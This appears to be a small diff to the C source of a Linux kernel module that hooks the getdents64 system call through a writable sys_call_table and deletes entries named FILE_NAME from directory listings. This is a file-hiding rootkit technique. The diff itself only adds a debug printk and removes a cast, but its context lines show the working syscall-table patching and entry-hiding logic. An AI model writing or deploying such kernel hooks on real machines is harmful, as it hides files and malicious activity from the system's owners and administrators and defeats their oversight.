@@ -35,6 +35,7 @@ next: next    dirp
     int size = curr->d_reclen;
 
     if(strncmp(curr->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
+      printk("🍺 Found the file\n");
       char *next = (char*)curr + size;
       int len = (uintptr_t)dirp + nob - (uintptr_t)next;
       memmove(curr, next, len);
@@ -89,7 +90,7 @@ int f_init(void) {
     return -1;
   }
 
-  sys_call_table = (void*)a;
+  sys_call_table = a;
 
   set_page_rw((uintptr_t)sys_call_table, 1);
   getdents64_original = sys_call_table[__NR_getdents64];
